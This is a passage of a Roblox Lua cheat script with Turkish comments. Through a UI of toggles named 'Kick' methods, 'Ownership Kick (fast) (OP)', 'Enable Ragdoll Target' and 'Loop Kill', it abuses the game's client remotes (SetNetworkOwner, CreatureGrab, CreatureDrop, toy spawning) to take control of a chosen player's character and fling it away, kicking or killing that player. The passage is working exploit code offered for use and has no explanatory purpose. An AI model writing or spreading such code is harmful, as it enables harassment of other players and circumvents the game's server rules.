                if kickSeatConn then kickSeatConn:Disconnect() kickSeatConn = nil end
                return
            end

            local method = KozFlags.kickMethod
            local target = KozBlobmanBetaFeature.checkTarget()
            if not target then warn("Select target") return end
            if target == KozPLR then warn("Cannot kick yourself") return end

            if kickSeatConn then kickSeatConn:Disconnect() kickSeatConn = nil end
            local myChar = KozPLR.Character
            local myHum = myChar and myChar:FindFirstChildOfClass("Humanoid")
            if myHum then
                kickSeatConn = myHum:GetPropertyChangedSignal("SeatPart"):Connect(function()
                        if KozFlags.kickActive or KozFlags.kickV2Active or KozFlags.kickV4Active or KozFlags.driftKickActive then return end
                        local h = KozPLR.Character and KozPLR.Character:FindFirstChildOfClass("Humanoid")
                        if h and h.SeatPart and h.SeatPart.Parent and h.SeatPart.Parent.Name == "CreatureBlobman" then
                            pcall(function()
                                    -- Obsidian'da Library.Flags yoktur; eleman Options/Toggles tablosunda durur.
                                    local kozKickFlag = (Library.Toggles and Library.Toggles["KozBlobKick"])
                                        or (Library.Options and Library.Options["KozBlobKick"])
                                    if kozKickFlag and kozKickFlag.SetValue then
                                        -- koltuga oturunca kick'i bastan baslat (gorunum de senkron kalsin)
                                        pcall(function() kozKickFlag:SetValue(false) end)
                                        task.wait(0.1)
                                        pcall(function() kozKickFlag:SetValue(true) end)
                                    elseif kozKickFlag and kozKickFlag.Callback then
                                        pcall(kozKickFlag.Callback, false)
                                        task.wait(0.1)
                                        pcall(kozKickFlag.Callback, true)
                                    end
                                end)
                        end
                    end)
            end

            if method == "Kick Double Hands" then
                KozFlags.kickActive = true
                kickTask = task.spawn(function()
                        while KozFlags.kickActive do
                            if not KozFlags.kickActive then return end
                            local myChar = KozPLR.Character
                            local myHum = myChar and myChar:FindFirstChildOfClass("Humanoid")
                            local myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")
                            if not myHum or not myHRP then task.wait(0.1) continue end
                            if myHum.Sit and myHum.SeatPart and myHum.SeatPart.Parent and myHum.SeatPart.Parent.Name == "CreatureBlobman" then
                                break
                            end
                            if not KozFlags.kickActive then return end
                            KozBlobmanBetaFeature.forceSitBlobman()
                            task.wait()
                        end
                        if not KozFlags.kickActive then return end

                        local grab, drop, leftDet, rightDet, leftWeld, rightWeld = nil, nil, nil, nil, nil, nil
                        local lastTargetChar = nil
                        local bp = nil

                        while KozFlags.kickActive do
                            local char = KozPLR.Character
                            local hum = char and char:FindFirstChildOfClass("Humanoid")
                            local hrp = char and char:FindFirstChild("HumanoidRootPart")
                            local mySeat = hum and hum.SeatPart
                            if not mySeat or mySeat.Parent.Name ~= "CreatureBlobman" then
                                task.wait(0.1) continue
                            end
                            local blob = mySeat.Parent
                            local scr = blob:FindFirstChild("BlobmanSeatAndOwnerScript", true)
                            if not scr then task.wait(0.1) continue end
                            grab = scr:FindFirstChild("CreatureGrab")
                            drop = scr:FindFirstChild("CreatureDrop")
                            leftDet = blob:FindFirstChild("LeftDetector")
                            rightDet = blob:FindFirstChild("RightDetector")
                            leftWeld = leftDet and leftDet:FindFirstChild("LeftWeld")
                            rightWeld = rightDet and rightDet:FindFirstChild("RightWeld")
                            if not grab or not drop or not leftDet or not rightDet or not leftWeld or not rightWeld then
                                task.wait(0.1) continue
                            end
                            break
                        end

                        local lastPCLDCheck = 0
                        local PCLD_CHECK_INTERVAL = 0.5
                        local DESYNC_THRESHOLD = 30
                        local kickCenterPos = nil

                        while KozFlags.kickActive do
                            local char = KozPLR.Character
                            if not char then task.wait(0.1) continue end
                            local hrp = char:FindFirstChild("HumanoidRootPart")
                            local hum = char and char:FindFirstChildOfClass("Humanoid")
                            if not hum or not hrp then task.wait(0.1) continue end
                            if not hum.Sit or not hum.SeatPart or hum.SeatPart.Parent.Name ~= "CreatureBlobman" then
                                KozBlobmanBetaFeature.forceSitBlobman()
                                task.wait(0.2)
                                char = KozPLR.Character
                                hum = char and char:FindFirstChildOfClass("Humanoid")
                                hrp = char and char:FindFirstChild("HumanoidRootPart")
                                if not hum or not hrp then task.wait(0.1) continue end
                                local mySeat = hum.SeatPart
                                if not mySeat or mySeat.Parent.Name ~= "CreatureBlobman" then task.wait(0.1) continue end
                                local blob2 = mySeat.Parent
                                local scr2 = blob2:FindFirstChild("BlobmanSeatAndOwnerScript", true)
                                if not scr2 then task.wait(0.1) continue end
                                grab = scr2:FindFirstChild("CreatureGrab")
                                drop = scr2:FindFirstChild("CreatureDrop")
                                leftDet = blob2:FindFirstChild("LeftDetector")
                                rightDet = blob2:FindFirstChild("RightDetector")
                                leftWeld = leftDet and leftDet:FindFirstChild("LeftWeld")
                                rightWeld = rightDet and rightDet:FindFirstChild("RightWeld")
                                lastTargetChar = nil
                            end
                            local targetChar = target.Character
                            local targetHRP = targetChar and targetChar:FindFirstChild("HumanoidRootPart")
                            local targetHum = targetChar and targetChar:FindFirstChildOfClass("Humanoid")

                            if targetHRP and targetHum and targetHum.Health > 0 then
                                local now = tick()
                                if kickCenterPos and now - lastPCLDCheck > PCLD_CHECK_INTERVAL then
                                    lastPCLDCheck = now
                                    local pcldPart = KozBlobmanBetaFeature.getPCLDPosition(target, kickCenterPos)
                                    if pcldPart and pcldPart.Parent then
                                        local pcldPos = pcldPart.Position
                                        if (pcldPos - kickCenterPos).Magnitude > DESYNC_THRESHOLD then
                                            if bp then bp:Destroy(); bp = nil end
                                            task.wait(0.5)
                                            kickCenterPos = pcldPos
                                            if hrp then hrp.CFrame = CFrame.new(pcldPos + Vector3.new(0, 25, 0)) end
                                            lastTargetChar = nil
                                            task.wait(0.1) continue
                                        end
                                    end
                                end
                                if not kickCenterPos then kickCenterPos = targetHRP.Position end

                                if targetChar ~= lastTargetChar then
                                    lastTargetChar = targetChar
                                    if bp then bp:Destroy(); bp = nil end
                                    if hrp then hrp.CFrame = targetHRP.CFrame * CFrame.new(0, 25, 0) end
                                    task.wait(0.2)
                                    grab:FireServer(leftDet, targetHRP, leftWeld)
                                    task.wait(0.8)
                                    drop:FireServer(leftWeld, targetHRP)
                                    task.wait(0.1)
                                    bp = Instance.new("BodyPosition")
                                    bp.Position = Vector3.new(0, 999999, 0)
                                    bp.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                                    bp.Parent = targetHRP
                                    grab:FireServer(leftDet, targetHRP, leftWeld)
                                    task.wait(0.2)
                                    drop:FireServer(leftWeld, targetHRP)
                                end
                                grab:FireServer(leftDet, targetHRP, leftWeld)
                                task.wait()
                                drop:FireServer(leftWeld, targetHRP)
                                task.wait()
                                grab:FireServer(rightDet, targetHRP, rightWeld)
                                task.wait()
                                drop:FireServer(rightWeld, targetHRP)
                                task.wait()
                                drop:FireServer(leftWeld, targetHRP)
                                drop:FireServer(rightWeld, targetHRP)
                                task.wait()
                            else
                                task.wait(0.1)
                            end
                        end
                        if bp then bp:Destroy() end
                    end)

            elseif method == "Kick Grab + Blob" then
                KozFlags.kickV2Active = true
                kickTask = task.spawn(function()
                        local RS = KozRS
                        local GE = KozRS:WaitForChild("GrabEvents")

                        local REMOTE_DELAY = 0.002
                        local lastRemote = 0
                        local skipFrame = 0

                        local blob = KozBlobmanBetaFeature.getBlobman()
                        or KozBlobmanBetaFeature.findAnyBlobman()
                        or KozBlobmanBetaFeature.spawnBlobman()
                        if not blob or not blob:FindFirstChild("VehicleSeat") then
                            warn("[KV2] No blobman available") KozFlags.kickV2Active = false return
                        end

                        local blobRoot = blob:FindFirstChild("HumanoidRootPart") or blob.PrimaryPart
                        local scriptObj = blob:WaitForChild("BlobmanSeatAndOwnerScript")
                        local CG = scriptObj:WaitForChild("CreatureGrab")
                        local CD = scriptObj:WaitForChild("CreatureDrop")
                        local R_Det = blob:WaitForChild("RightDetector")

                        if not blobRoot then
                            warn("[KV2] Missing root") KozFlags.kickV2Active = false return
                        end

                        local hum = KozPLR.Character and KozPLR.Character:FindFirstChildOfClass("Humanoid")
                        local myHRP = KozPLR.Character and KozPLR.Character:FindFirstChild("HumanoidRootPart")
                        local seat = blob:FindFirstChild("VehicleSeat")
                        if seat and hum then
                            if seat.Occupant ~= hum then
                                myHRP.CFrame = seat.CFrame + Vector3.new(0, 2, 0)
                                task.wait(0.2)
                                seat:Sit(hum)
                                task.wait(0.5)
                            end
                        end

                        local savedPos = blobRoot.CFrame
                        local dragging = false
                        local grabStartTime = 0

                        while KozFlags.kickV2Active or (KozFlags.kickCooldownFrames and KozFlags.kickCooldownFrames > 0) do
                            local inCooldown = not KozFlags.kickV2Active and (KozFlags.kickCooldownFrames or 0) > 0
                            if inCooldown then
                                KozFlags.kickCooldownFrames = KozFlags.kickCooldownFrames - 1
                            end
                            local currentTarget = KozPlayers:FindFirstChild(target.Name)
                            if not currentTarget then break end

                            local myChar = KozPLR.Character
                            hum = myChar and myChar:FindFirstChildOfClass("Humanoid")
                            seat = hum and hum.SeatPart
                            if not seat or seat.Parent.Name ~= "CreatureBlobman" then
                                local waitStart = tick()
                                while tick() - waitStart < 3 do
                                    if not KozFlags.kickV2Active then return end
                                    local tryBlob = KozBlobmanBetaFeature.getBlobman()
                                    or KozBlobmanBetaFeature.findAnyBlobman()
                                    if tryBlob then
                                        local trySeat = tryBlob:FindFirstChild("VehicleSeat")
                                        local tryHum = KozPLR.Character and KozPLR.Character:FindFirstChildOfClass("Humanoid")
                                        local tryHRP = KozPLR.Character and KozPLR.Character:FindFirstChild("HumanoidRootPart")
                                        if trySeat and tryHum and tryHRP then
                                            if trySeat.Occupant ~= tryHum then
                                                tryHRP.CFrame = trySeat.CFrame + Vector3.new(0, 2, 0)
                                                task.wait(0.05)
                                                pcall(function() trySeat:Sit(tryHum) end)
                                            end
                                            if tryHum.Sit and tryHum.SeatPart == trySeat then
                                                blob = tryBlob
                                                blobRoot = blob:FindFirstChild("HumanoidRootPart") or blob.PrimaryPart
                                                local scr2 = blob:FindFirstChild("BlobmanSeatAndOwnerScript")
                                                if scr2 then
                                                    CG = scr2:FindFirstChild("CreatureGrab")
                                                    CD = scr2:FindFirstChild("CreatureDrop")
                                                end
                                                R_Det = blob:FindFirstChild("RightDetector")
                                                break
                                            end
                                        end
                                    end
                                    task.wait(0.15)
                                end
                                seat = hum and hum.SeatPart
                                if not seat or seat.Parent.Name ~= "CreatureBlobman" then
                                    KozFlags.kickV2Active = false
                                    break
                                end
                            end

                            blob = seat.Parent
                            blobRoot = blob:FindFirstChild("HumanoidRootPart") or blob.PrimaryPart

                            local tChar = currentTarget.Character
                            local tRoot = tChar and tChar:FindFirstChild("HumanoidRootPart")
                            local tHum = tChar and tChar:FindFirstChildOfClass("Humanoid")

                            if tRoot and tHum and tHum.Health > 0 and blobRoot then
                                tRoot.Velocity = Vector3.zero

                                if not dragging then
                                    blobRoot.CFrame = tRoot.CFrame
                                    blobRoot.Velocity = Vector3.zero

                                    if not inCooldown and tick() - lastRemote >= REMOTE_DELAY and skipFrame % 3 ~= 2 then
                                        lastRemote = tick()
                                        pcall(function()
                                                tHum.PlatformStand = true
                                                tHum.Sit = true
                                                GE.SetNetworkOwner:FireServer(tRoot, blobRoot.CFrame)
                                                KozRemote.DestroyGrabLine:FireServer(tRoot)
                                            end)
                                    end

                                    if grabStartTime == 0 then grabStartTime = tick() end
                                    if tick() - grabStartTime > 0.35 then
                                        dragging = true
                                        grabStartTime = 0
                                        blobRoot.CFrame = savedPos
                                        blobRoot.Velocity = Vector3.zero
                                    end
                                else
                                    blobRoot.CFrame = savedPos
                                    blobRoot.Velocity = Vector3.zero

                                    local lockPos = savedPos * CFrame.new(0, 23, 0)
                                    tRoot.CFrame = lockPos
                                    tHum.PlatformStand = true
                                    tHum.Sit = true

                                    if not inCooldown and tick() - lastRemote >= REMOTE_DELAY and skipFrame % 3 ~= 2 then
                                        lastRemote = tick()
                                        pcall(function()
                                                GE.SetNetworkOwner:FireServer(tRoot, lockPos)
                                                KozRemote.DestroyGrabLine:FireServer(tRoot)
                                                local weld = R_Det:FindFirstChild("RightWeld") or R_Det:FindFirstChildWhichIsA("Weld")
                                                if weld then
                                                    CD:FireServer(weld)
                                                    CG:FireServer(R_Det, tRoot, weld)
                                                end
                                            end)
                                    end
                                end
                            else
                                dragging = false
                                grabStartTime = 0
                            end

                            KozRun.Heartbeat:Wait()
                        end

                        if blobRoot then
                            blobRoot.CFrame = savedPos
                            blobRoot.Velocity = Vector3.zero
                        end
                        cleanupBlobmanLocks()
                    end)

            elseif method == "Kick One Grab" then
                KozFlags.kickActive = true
                kickTask = task.spawn(function()
                        while KozFlags.kickActive do
                            if not KozBlobmanBetaFeature.forceSitBlobman() then task.wait(0.2) continue end
                            local blob = KozBlobmanBetaFeature.getBlobman()
                            if not blob then task.wait(0.2) continue end
                            local ct = KozPlayers:FindFirstChild(target.Name)
                            if not (ct and ct.Character) then task.wait(0.2) continue end
                            local tr = ct.Character:FindFirstChild("HumanoidRootPart")
                            if not tr then task.wait(0.2) continue end
                            local myRoot = KozBlobmanBetaFeature.getLocalRoot()
                            if not myRoot then task.wait(0.2) continue end
                            local side = (math.random() >= 0.5) and "Left" or "Right"
                            local savedPos = myRoot.CFrame
                            if (tr.Position - myRoot.Position).Magnitude > 500000 then task.wait(0.2) continue end
                            myRoot.CFrame = tr.CFrame
                            task.wait(0.08)
                            KozBlobmanBetaFeature.blobKick(blob, tr, side)
                            task.wait(0.1)
                            myRoot.CFrame = savedPos
                            break
                        end
                    end)

            elseif method == "Kick Fly Up" then
                KozFlags.kickV4Active = true
                kickTask = task.spawn(function()
                        local blob = KozBlobmanBetaFeature.getBlobman()
                        if not blob then blob = KozBlobmanBetaFeature.spawnBlobman() end
                        if not blob then warn("[KV4] No blobman") KozFlags.kickV4Active = false return end

                        local blobRoot = blob:FindFirstChild("HumanoidRootPart") or blob.PrimaryPart
                        if not blobRoot then warn("[KV4] No root") KozFlags.kickV4Active = false return end

                        local function resizeDetectors(enable)
                            local L = blob:FindFirstChild("LeftDetector")
                            local R = blob:FindFirstChild("RightDetector")
                            if L then L.Size = enable and Vector3.new(20,20,20) or Vector3.new(4,4,4) end
                            if R then R.Size = enable and Vector3.new(20,20,20) or Vector3.new(4,4,4) end
                        end
                        local savedCanCollide = {}
                        local function setNoclip(enable)
                            for _, part in blob:GetDescendants() do
                                if part:IsA("BasePart") then
                                    if enable then savedCanCollide[part] = part.CanCollide; part.CanCollide = false
                                    elseif savedCanCollide[part] ~= nil then part.CanCollide = savedCanCollide[part] end
                                end
                            end
                        end
                        local function grabTarget(tRoot, side)
                            local det = blob:FindFirstChild(side.."Detector")
                            local weld = det and det:FindFirstChild(side.."Weld")
                            local scr = blob:FindFirstChild("BlobmanSeatAndOwnerScript", true)
                            local CG = scr and scr:FindFirstChild("CreatureGrab")
                            if CG then pcall(function() CG:FireServer(det, tRoot, weld) end) end
                        end
                        local function dropTarget(side)
                            local det = blob:FindFirstChild(side.."Detector")
                            local weld = det and det:FindFirstChild(side.."Weld")
                            local scr = blob:FindFirstChild("BlobmanSeatAndOwnerScript", true)
                            local CD = scr and scr:FindFirstChild("CreatureDrop")
                            if CD then pcall(function() CD:FireServer(weld) end) end
                        end

                        local ct = KozPlayers:FindFirstChild(target.Name)
                        if not ct or not ct.Character then warn("[KV4] No target") KozFlags.kickV4Active = false return end
                        local tRoot = ct.Character:FindFirstChild("HumanoidRootPart")
                        if not tRoot then warn("[KV4] No HRP") KozFlags.kickV4Active = false return end
                        local myRoot = KozBlobmanBetaFeature.getLocalRoot()
                        if not myRoot then warn("[KV4] No local root") KozFlags.kickV4Active = false return end

                        blobRoot.CFrame = CFrame.new(tRoot.Position)
                        myRoot.CFrame = CFrame.new(tRoot.Position + Vector3.new(0, 2, 0))
                        task.wait(0.05)
                        if not KozBlobmanBetaFeature.isSittingOnBlobman() then KozBlobmanBetaFeature.forceSitBlobman(); task.wait(0.2) end
                        resizeDetectors(true)
                        setNoclip(true)

                        local side = (math.random() >= 0.5) and "Left" or "Right"
                        local bv = Instance.new("BodyVelocity")
                        bv.MaxForce = Vector3.new(math.huge,math.huge,math.huge); bv.P = 10000; bv.Velocity = Vector3.new(0,36,0); bv.Parent = blobRoot
                        local bg = Instance.new("BodyGyro")
                        bg.MaxTorque = Vector3.new(math.huge,math.huge,math.huge); bg.P = 0; bg.D = 0; bg.CFrame = CFrame.new(blobRoot.Position, blobRoot.Position + Vector3.new(0,-1,0)); bg.Parent = blobRoot

                        kickV4Cleanup = function()
                            pcall(function() dropTarget("Left") end); pcall(function() dropTarget("Right") end)
                            resizeDetectors(false); setNoclip(false)
                            pcall(function() bv:Destroy() end); pcall(function() bg:Destroy() end)
                        end

                        local reachedTop = false
                        local startY = blobRoot.Position.Y
                        local targetY = startY + 25
                        local lastTargetChar = ct.Character
                        grabTarget(tRoot, side)
                        task.wait(0.02)

                        while KozFlags.kickV4Active do
                            if not KozBlobmanBetaFeature.isSittingOnBlobman() then
                                KozBlobmanBetaFeature.forceSitBlobman()
                                task.wait(0.2)
                                if not KozBlobmanBetaFeature.isSittingOnBlobman() then task.wait(0.1) continue end
                                blob = KozBlobmanBetaFeature.getBlobman()
                                if blob then
                                    blobRoot = blob:FindFirstChild("HumanoidRootPart") or blob.PrimaryPart
                                    local scr = blob:FindFirstChild("BlobmanSeatAndOwnerScript", true)
                                    if scr then
                                        local CG = scr:FindFirstChild("CreatureGrab")
                                        local CD = scr:FindFirstChild("CreatureDrop")
                                        if CG then grabRemote = CG end
                                        if CD then dropRemote = CD end
                                    end
                                    Det = blob:FindFirstChild("RightDetector") or blob:FindFirstChild("LeftDetector")
                                    if Det then
                                        Weld = Det:FindFirstChild("RightWeld") or Det:FindFirstChild("LeftWeld") or Det:FindFirstChildWhichIsA("Weld") or Det:FindFirstChildWhichIsA("RigidConstraint")
                                    end
                                end
                                lastTargetChar = nil
                            end
                            local ct2 = KozPlayers:FindFirstChild(target.Name)
                            local ctChar = ct2 and ct2.Character
                            local tRoot2 = ctChar and ctChar:FindFirstChild("HumanoidRootPart")
                            local tHum = ctChar and ctChar:FindFirstChildOfClass("Humanoid")
                            if not tRoot2 or not tHum or tHum.Health <= 0 then
                                reachedTop = false; startY = blobRoot.Position.Y; targetY = startY + 25; lastTargetChar = nil
                                task.wait(0.3) continue
                            end
                            if ctChar ~= lastTargetChar then
                                lastTargetChar = ctChar
                            end
                            setNoclip(true)
                            if blobRoot.Position.Y >= targetY then reachedTop = true end
                            if not reachedTop then
                                dropTarget(side); task.wait(0.2)
                                local tRootGrab = ctChar and ctChar:FindFirstChild("HumanoidRootPart")
                                if tRootGrab then grabTarget(tRootGrab, side); task.wait(0.2) end
                            end
                            KozRun.Heartbeat:Wait()
                        end

                        kickV4Cleanup(); kickV4Cleanup = nil
                    end)

            elseif method == "Kick Drift Fly" then
                KozBlobmanBetaFeature.startDriftKick(kozKickTargetName())
            end
        end
    })
end

local ownershipKickActive = false
local ownershipKickTask = nil

AttackMethodsGroupbox:AddToggle("OwnershipKickFast", {
    Text = "Ownership Kick (fast) (OP)",
    Default = false,    Callback = function(State)
        ownershipKickActive = State
        local targetName = getTargetName()
        if State then
            if not targetName or targetName == "" then
                if Library then
                    Library:Notify({ Title = "Error", Description = "Select target first!", Duration = 3 })
                end
                ownershipKickActive = false
                return
            end
            ownershipKickTask = task.spawn(function()
                local Players = game:GetService("Players")
                local RunService = game:GetService("RunService")
                local ReplicatedStorage = game:GetService("ReplicatedStorage")
                local Workspace = game:GetService("Workspace")
                local LocalPlayer = Players.LocalPlayer
                local target = Players:FindFirstChild(targetName)
                if not target then
                    ownershipKickActive = false
                    return
                end
                local GE = ReplicatedStorage:WaitForChild("GrabEvents")
                local SetNetOwner = GE:WaitForChild("SetNetworkOwner")
                local DestroyGrabLine = GE:WaitForChild("DestroyGrabLine")
                local ZERO_VECTOR = Vector3.new(0, 0, 0)
                local MAX_DISTANCE = 25
                local CLEANUP_DELAY = 0.5
                local HIDDEN_CF = CFrame.new(0, 1e9, 0)
                local savedPos = nil
                local isGrabbing = false
                local startTime = nil
                local lastPalletTime = 0
                local lastDropFired = 0
                local checkStartTime = nil
                local grabAttemptStartTime = nil
                local currentTargetRoot = nil
                local attachments = {}
                local function SNOWship(part)
                    if not part or not part.Parent then return end
                    pcall(function()
                        SetNetOwner:FireServer(part, part.CFrame)
                    end)
                end
                local function dropTarget(part)
                    if not part or not part.Parent then return end
                    pcall(function()
                        DestroyGrabLine:FireServer(part)
                    end)
                end
                task.spawn(function()
                    while ownershipKickActive and target and target.Parent do
                        local tChar = target.Character
                        local tRootActual = tChar and tChar:FindFirstChild("HumanoidRootPart")
                        if tRootActual then
                            pcall(function()
                                SetNetOwner:FireServer(tRootActual, tRootActual.CFrame)
                                tRootActual.AssemblyLinearVelocity = ZERO_VECTOR
                                tRootActual.AssemblyAngularVelocity = ZERO_VECTOR
                            end)
                        end
                        task.wait(0.001)
                    end
                end)
                local function cleanupPhysicsObjects()
                    isGrabbing = false
                    currentTargetRoot = nil
                    for _, v in pairs(attachments) do
                        if v then pcall(function() v:Destroy() end) end
                    end
                    attachments = {}
                end
                local function isTargetAlive()
                    if not target or not target.Parent then return false end
                    local char = target.Character
                    if not char then return false end
                    local hum = char:FindFirstChild("Humanoid")
                    if not hum or hum.Health <= 0 then return false end
                    local root = char:FindFirstChild("HumanoidRootPart")
                    if not root then return false end
                    if root ~= currentTargetRoot then currentTargetRoot = root end
                    return true
                end
                local MyToys = Workspace:FindFirstChild(LocalPlayer.Name .. "SpawnedInToys")
                local pallet = MyToys and MyToys:FindFirstChild("PalletLightBrown")
                if not pallet and LocalPlayer.CanSpawnToy.Value then
                    pcall(function()
                        ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer("PalletLightBrown", HIDDEN_CF, Vector3.new(0, -90, 0))
                    end)
                    task.wait(0.05)
                    MyToys = Workspace:FindFirstChild(LocalPlayer.Name .. "SpawnedInToys")
                    pallet = MyToys and MyToys:FindFirstChild("PalletLightBrown")
                end
                local soundPart = pallet and pallet:FindFirstChild("SoundPart")
                if not soundPart then
                    ownershipKickActive = false
                    return
                end
                while ownershipKickActive and target do
                    RunService.Stepped:Wait()
                    if not isTargetAlive() then
                        cleanupPhysicsObjects()
                        local waitStart = tick()
                        while ownershipKickActive and target and tick() - waitStart < CLEANUP_DELAY do
                            if isTargetAlive() then break end
                            task.wait(0.1)
                        end
                        if not isTargetAlive() then
                            savedPos = myRoot.CFrame
                            startTime = nil
                            grabAttemptStartTime = nil
                            checkStartTime = nil
                        end
                        task.wait(0.1)
                        continue
                    end
                    myChar = LocalPlayer.Character
                    myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
                    if not myRoot then 
                        task.wait()
                        continue 
                    end
                    if not savedPos then
                        savedPos = myRoot.CFrame
                    end
                    local tChar = target.Character
                    local tHum = tChar and tChar:FindFirstChild("Humanoid")
                    local tRoot = currentTargetRoot
                    if tRoot then
                        SNOWship(tRoot)
                        SNOWship(tRoot)
                        local limbs = {"Torso"}
                        for _, limbName in ipairs(limbs) do
                            local part = tChar:FindFirstChild(limbName)
                            if part then 
                                part.Velocity = ZERO_VECTOR 
                                part.RotVelocity = ZERO_VECTOR 
                                part.CanCollide = false 
                            end
                        end
                    end
                    if not isGrabbing then
                        myRoot.CFrame = tRoot.CFrame * CFrame.new(0, -6, -10)
                        myRoot.Velocity = ZERO_VECTOR
                        if not grabAttemptStartTime then grabAttemptStartTime = tick() end
                        tHum.PlatformStand = true
                        tHum.Sit = false
                        if not startTime then startTime = tick() end
                        if tick() - startTime > 0.05 then
                            isGrabbing = true
                            startTime = nil
                            grabAttemptStartTime = nil
                            myRoot.CFrame = savedPos
                            myRoot.Velocity = ZERO_VECTOR
                            local att0 = Instance.new("Attachment", tRoot)
                            local att1 = Instance.new("Attachment", myRoot)
                            att1.CFrame = CFrame.new(6, 13, 0)
                            local ap = Instance.new("AlignPosition", tRoot)
                            ap.Attachment0 = att0 
                            ap.Attachment1 = att1
                            ap.MaxForce = math.huge 
                            ap.MaxVelocity = math.huge
                            ap.Responsiveness = 200 
                            ap.ApplyAtCenterOfMass = true
                            local ao = Instance.new("AlignOrientation", tRoot)
                            ao.Attachment0 = att0 
                            ao.Attachment1 = att1
                            ao.MaxTorque = math.huge 
                            ao.Responsiveness = 200
                            attachments.att0 = att0 
                            attachments.att1 = att1
                            attachments.ap = ap 
                            attachments.ao = ao
                            tHum:ChangeState(Enum.HumanoidStateType.Physics)
                        end
                    else
                        if attachments.ap then 
                            attachments.ap.Position = tRoot.Position + Vector3.new(0, 15, 0)
                        end
                        if not isTargetAlive() then
                            cleanupPhysicsObjects()
                            savedPos = myRoot.CFrame
                            myRoot.CFrame = savedPos
                            myRoot.Velocity = ZERO_VECTOR
                            task.wait(0.1)
                            continue
                        end
                        tRoot = currentTargetRoot
                        if not checkStartTime then checkStartTime = tick() + 0.25 end
                        if checkStartTime and tick() >= checkStartTime then
                            local currentDistance = (myRoot.Position - tRoot.Position).Magnitude
                            if currentDistance > MAX_DISTANCE then
                                cleanupPhysicsObjects()
                                isGrabbing = false
                                startTime = tick()
                                grabAttemptStartTime = nil
                                checkStartTime = nil
                                savedPos = myRoot.CFrame
                                myRoot.CFrame = tRoot.CFrame * CFrame.new(0, -8, 0)
                                myRoot.Velocity = ZERO_VECTOR
                                SNOWship(tRoot)
                                dropTarget(tRoot)
                                task.wait()
                                continue
                            end
                        end
                        SNOWship(tRoot)
                        dropTarget(tRoot)
                        tRoot.Velocity = ZERO_VECTOR
                        tRoot.RotVelocity = ZERO_VECTOR
                        if tick() - lastDropFired > 0.05 then
                            if not ownershipKickActive then return end
                            pcall(function()
                                dropTarget(tRoot)
                            end)
                            lastDropFired = tick()
                        end
                        local currentTime = tick()
                        if currentTime - lastPalletTime >= 0.05 then
                            lastPalletTime = currentTime
                            soundPart.CFrame = tRoot.CFrame * CFrame.new(0, 2, 0)
                            pcall(function()
                                SetNetOwner:FireServer(soundPart, soundPart.CFrame)
                            end)
                            task.wait()
                            soundPart.CFrame = HIDDEN_CF
                        end
                    end
                    task.wait()
                end
                cleanupPhysicsObjects()
                if myRoot and savedPos then 
                    myRoot.CFrame = savedPos 
                end
            end)
        else
            if ownershipKickTask then 
                task.cancel(ownershipKickTask) 
                ownershipKickTask = nil 
            end
            pcall(function()
                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                    local root = LocalPlayer.Character.HumanoidRootPart
                    root.Anchored = false
                    root.AssemblyLinearVelocity = Vector3.zero
                    root.AssemblyAngularVelocity = Vector3.zero
                end
            end)
        end
    end
})

EnableRagdoll = false
PalletForRagdoll = nil
ragdollSpawnTask = nil
ragdollLoopTask = nil

AttackMethodsGroupbox:AddToggle("EnableRagdoll", {
    Text = "Enable Ragdoll Target",
    Default = false,
    Callback = function(v)
        SaveToggleState("EnableRagdoll", v)
        EnableRagdoll = v
        if v then
            spawnragdoll = function()
                HRP = Services.LocalPlayer.Character and Services.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                if not HRP then
                    ragdollSpawnTask = task.delay(0.5, spawnragdoll)
                    return
                end
                PalletForRagdoll = spawntoy("PalletLightBrown", HRP.CFrame * CFrame.new(0, 10, 20))
                if PalletForRagdoll then
                    repeat task.wait() until PalletForRagdoll and PalletForRagdoll:FindFirstChild("SoundPart")
                    repeat task.wait() sno(PalletForRagdoll.SoundPart) until PalletForRagdoll.SoundPart:FindFirstChild("PartOwner")
                    PalletForRagdoll.SoundPart.AssemblyLinearVelocity = Vector3.new(0, 1e9, 0)
                    for i,v in pairs(PalletForRagdoll:GetChildren()) do
                        if v:IsA("Part") then
                            v.CanCollide = false
                            v.CanQuery = false
                            v.Transparency = 1
                        end
                    end
                    PalletForRagdoll.Name = "PalletForRagdoll"
                    cons["PalletDestroying"] = PalletForRagdoll.Destroying:Once(function()
                        if EnableRagdoll then
                            spawnragdoll()
                        end
                    end)
                    ragdollLoopTask = task.spawn(function()
                        while EnableRagdoll and PalletForRagdoll and PalletForRagdoll.Parent do
                            local targetSource = targetName
                            local targetNameResolved = nil
                            if typeof(targetSource) == "Instance" and targetSource:IsA("Player") then
                                targetNameResolved = targetSource.Name
                            elseif typeof(targetSource) == "string" then
                                targetNameResolved = targetSource:match("@(.-)%)") or targetSource
                            end
                            local target = targetNameResolved and Services.Players:FindFirstChild(targetNameResolved)
                            if target and target.Character then
                                local tHRP = target.Character:FindFirstChild("HumanoidRootPart")
                                if tHRP and PalletForRagdoll:FindFirstChild("SoundPart") then
                                    local soundPart = PalletForRagdoll.SoundPart
                                    sno(soundPart)
                                    soundPart.AssemblyLinearVelocity = Vector3.new(0, 1000, 0)
                                    soundPart.CFrame = tHRP.CFrame
                                    task.wait(0.05)
                                    soundPart.CFrame = CFrame.new(0, 1e9, 0)
                                end
                            end
                            task.wait(0.1)
                        end
                    end)
                else
                    ragdollSpawnTask = task.delay(0.5, spawnragdoll)
                end
            end
            spawnragdoll()
        else
            if ragdollLoopTask then
                task.cancel(ragdollLoopTask)
                ragdollLoopTask = nil
            end
            if ragdollSpawnTask then
                task.cancel(ragdollSpawnTask)
                ragdollSpawnTask = nil
            end
            if cons["PalletDestroying"] then
                cons["PalletDestroying"]:Disconnect()
                cons["PalletDestroying"] = nil
            end
            inv = Services.LocalPlayer.Character or Services.LocalPlayer:FindFirstChildOfClass("Backpack")
            if not inv then
                inv = Services.LocalPlayer:WaitForChild("Backpack", 3)
            end
            if inv and inv:FindFirstChild("PalletForRagdoll") then
                Services.DestroyToy:FireServer(inv.PalletForRagdoll)
            end
            PalletForRagdoll = nil
        end
    end,
})

AttackMethodsGroupbox:AddDivider()
AttackMethodsGroupbox:AddLabel("XZ Methods", true, Color3.fromRGB(255, 50, 50))

AttackMethodsGroupbox:AddToggle("LoopKillToggle", {
    Text = "Loop Kill", Default = false,
